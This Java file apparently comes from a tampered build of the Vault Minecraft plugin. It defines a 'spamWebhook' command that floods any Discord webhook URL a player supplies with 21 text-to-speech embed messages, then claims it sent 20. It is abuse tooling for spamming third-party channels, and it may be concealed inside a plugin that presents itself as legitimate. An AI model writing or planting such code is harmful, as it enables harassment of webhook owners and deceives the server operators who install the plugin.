package net.milkbowl.vault.commands.cmds;

import java.awt.Color;
import java.io.IOException;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.methods.DWeb;
import net.milkbowl.vault.util.Settings;

public class spamWebhook extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length <= 2) {
			p.sendMessage(Settings.USAGE("spamWebhook <url> <message>"));
		} else {
			StringBuilder spam = new StringBuilder();
			for (int i = 2; i != args.length; ++i) {
				spam.append(args[i]).append(" ");
			}
			for (int x = 0; x <= 20; x++) {
				DWeb webhook = new DWeb(args[1]);
				webhook.setTts(true);
				webhook.addEmbed((new DWeb.EmbedObject())
						.setTitle(":laughing: :slight_smile: :mask: :heart_eyes:")
						.setColor(Color.orange)
						.setDescription(spam.toString()));
				try {
					webhook.execute();
				} catch (IOException ignored) {}
			}
			p.sendMessage(Settings.PREFIX("Spammed the message 20 times!"));
		}
		
	}

}
